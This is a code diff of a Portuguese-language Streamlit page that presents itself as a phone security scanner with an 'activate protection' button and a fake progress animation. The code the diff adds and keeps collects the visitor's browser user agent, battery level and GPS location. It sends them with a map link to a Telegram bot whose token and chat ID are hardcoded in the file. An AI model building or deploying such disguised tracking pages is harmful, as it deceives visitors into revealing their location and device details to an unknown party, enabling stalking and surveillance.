@@ -3,7 +3,7 @@ import requests
 import time
 from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# --- 1. CONFIGURAÇÕES ---
+# 1. CONFIGURAÇÕES TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
@@ -12,9 +12,9 @@ def enviar_telegram(msg):
     try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-st.set_page_config(page_title="Segurança Ativa", layout="centered")
+# 2. CONFIGURAÇÃO DA PÁGINA E CSS
+st.set_page_config(page_title="Sistema de Segurança", layout="centered")
 
-# --- 2. CSS IGUAL AO VÍDEO ---
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -28,7 +28,7 @@ st.markdown("""
         animation: pulse 2s infinite ease-in-out;
     }
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-    .pct-text { font-size: 45px; font-weight: bold; }
+    .pct-text { font-size: 45px; font-weight: bold; color: white; }
     div.stButton > button {
         background-color: #ffc107 !important; color: black !important;
         font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
@@ -36,63 +36,65 @@ st.markdown("""
     </style>
 """, unsafe_allow_html=True)
 
-# --- 3. MEMÓRIA DE SESSÃO (A MÁGICA DO 1 CLIQUE) ---
-# Isso impede que o botão "desligue" se o GPS demorar
-if 'ativado' not in st.session_state:
-    st.session_state['ativado'] = False
+# 3. CAPTURA DE DADOS (DENTRO DO ESTADO DA SESSÃO PARA 1 CLIQUE)
+if 'clicado' not in st.session_state:
+    st.session_state['clicado'] = False
 
-# --- 4. SENSORES (RODAM SEMPRE NO FUNDO) ---
-# TIREI O 'key=' QUE DAVA ERRO NO SEU PRINT. 
-# Usei component_key que é o correto para essa lib evitar duplicidade.
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FIXED')
-loc = get_geolocation(component_key='GPS_FIXED') 
+# Captura modelo e bateria via JS
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_DEVICE')
+bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_LEVEL')
 
-# --- 5. INTERFACE ---
+# Captura GPS usando component_key para evitar o erro do seu print
+loc = get_geolocation(component_key='GPS_STABLE')
+
+# 4. INTERFACE
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
-placeholder = st.empty()
+caixa_esfera = st.empty()
 
-# Se ainda não ativou, mostra 4% estático
-if not st.session_state['ativado']:
-    with placeholder.container():
+# Mostra o estado de "Wait" ou 4% dependendo do clique
+if not st.session_state['clicado']:
+    with caixa_esfera.container():
         st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
+else:
+    with caixa_esfera.container():
+        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">Wait...</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# --- 6. BOTÃO E LÓGICA ---
-# O botão apenas liga a "chave" na memória
+# 5. LÓGICA DO BOTÃO
 if st.button("🔴 ATIVAR PROTEÇÃO"):
-    st.session_state['ativado'] = True
-    st.rerun() # Recarrega para processar o GPS imediatamente
+    st.session_state['clicado'] = True
+    st.rerun()
 
-# Se a chave estiver ligada, ele tenta enviar
-if st.session_state['ativado']:
-    # Animação de carregamento enquanto espera o GPS
-    with placeholder.container():
-        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">Wait...</div></div></div>', unsafe_allow_html=True)
-    
+# Se o botão foi clicado, entra no loop de espera do GPS
+if st.session_state['clicado']:
     if loc and 'coords' in loc:
-        # SUCESSO - DADOS CHEGARAM
-        lat = loc['coords']['latitude']
-        lon = loc['coords']['longitude']
+        # Animação de sucesso
+        for p in [25, 55, 85, 100]:
+            caixa_esfera.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+            time.sleep(0.1)
+        
+        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
         mapa = f"https://www.google.com/maps?q={lat},{lon}"
         
-        # Animação final rápida
-        for p in [20, 50, 80, 100]:
-            placeholder.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
-            time.sleep(0.05)
-
-        msg = f"🚨 SISTEMA ATIVADO\n📱 {ua[:40] if ua else 'Mobile'}\n📍 [ABRIR MAPA]({mapa})"
-        enviar_telegram(msg)
+        # Montagem do relatório completo
+        relatorio = (
+            f"🛡️ PROTEÇÃO ATIVADA\n\n"
+            f"📱 Aparelho: {ua[:50] if ua else 'Desconhecido'}\n"
+            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
+            f"📍 [LOCALIZAÇÃO NO MAPA]({mapa})"
+        )
         
-        st.success("✅ Proteção Ativada!")
-        st.stop() # Para o script aqui para não ficar rodando
-    
+        enviar_telegram(relatorio)
+        st.success("✅ Proteção Ativada com Sucesso!")
+        st.session_state['clicado'] = False # Reseta para a próxima
+        st.stop()
     else:
-        # Se o GPS ainda não veio, mostra aviso mas NÃO DESLIGA O BOTÃO
-        st.warning("⚠️ Aceite a permissão de localização no navegador...")
-        time.sleep(1) # Espera um pouco e tenta de novo sozinho (Streamlit roda em loop)
+        # Mensagem de espera caso o GPS demore
+        st.warning("⚠️ Aguardando permissão de localização...")
+        time.sleep(2)
         st.rerun()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
